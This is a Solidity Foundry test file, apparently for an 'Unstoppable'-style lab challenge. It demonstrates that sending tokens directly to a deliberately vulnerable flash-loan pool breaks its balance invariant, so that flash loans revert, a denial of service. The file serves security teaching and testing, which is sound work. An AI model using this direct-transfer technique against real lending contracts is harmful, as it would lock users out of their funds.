// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {ERC20Mint} from "src/exchange/ERC20Mint.sol";
import {VulnerablePool} from "src/unstoppable/VulnerablePool.sol";
import {IERC3156FlashBorrower, IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156.sol";

abstract contract UnstoppableTest is Test, IERC3156FlashBorrower {
    ERC20Mint token;
    VulnerablePool pool;
    address user = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        // 1) Deploy token
        token = new ERC20Mint("My Test Token", "MTK");

        // 2) Deploy pool
        pool = new VulnerablePool(token, "My Test Token", "MTK", msg.sender); {}

        // 3) Mint tokens for user
        token.mint(user, 100 ether);

        // 4) Approve and deposit into pool
        vm.startPrank(user);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(100 ether, user);
        vm.stopPrank();

        // 5) Sanity check
        assertEq(token.balanceOf(address(pool)), pool.totalAssets());
    }

    /// @notice Demonstrates that sending tokens directly to the pool breaks the flashLoan invariant
    function testBreakByDirectTransfer() public {
        // attacker mints tokens
        vm.prank(attacker);
        token.mint(attacker, 10 ether);

        // attacker transfers directly to pool (bypassing deposit)  
        vm.prank(attacker);
        token.transfer(address(pool), 10 ether);

        // flashLoan should now revert due to broken invariant
        vm.expectRevert(bytes("invariant violated"));
        pool.flashLoan(IERC3156FlashBorrower(this), address(token), 1 ether, "");
    }

    /// @notice Optional: demonstrate pool still works normally before attacker
    function testFlashLoanBeforeAttack() public {
    // mint and deposit to ensure invariant holds
    	token.mint(user, 50 ether);
    	vm.startPrank(user);
    	token.approve(address(pool), type(uint256).max);
    	pool.deposit(50 ether, user);
    	vm.stopPrank();

    // flashLoan should succeed now
    	pool.flashLoan(IERC3156FlashBorrower(this), address(token), 10 ether, "");
    }
}


